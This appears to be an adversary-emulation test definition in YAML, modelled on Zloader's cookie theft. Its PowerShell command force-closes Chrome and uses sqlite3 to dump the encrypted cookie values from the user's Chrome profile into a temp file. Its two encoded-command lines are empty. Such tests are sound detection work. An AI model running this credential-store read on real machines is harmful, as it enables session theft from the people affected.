- id: 2c21883c-2797-5bc2-8a9f-7ffd1507852b
  name: Soumaia ART Tests - Steal Chrome Cookies (Windows)
  description: "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf."
  tactic: credential-access
  technique:
    attack_id: T1539
    name: Steal Web Session Cookie
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand 
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          stop-process -name "chrome" -force -erroraction silentlycontinue
          "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c $env:TEMP\ART-ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe "$env:localappdata\Google\Chrome\User Data\Default\Network\Cookies" | out-file -filepath "$env:TEMP\ART-ExternalPayloads\T1539ChromeCookies.txt"
        cleanup: |-
          remove-item $env:TEMP\ART-ExternalPayloads\T1539ChromeCookies.txt
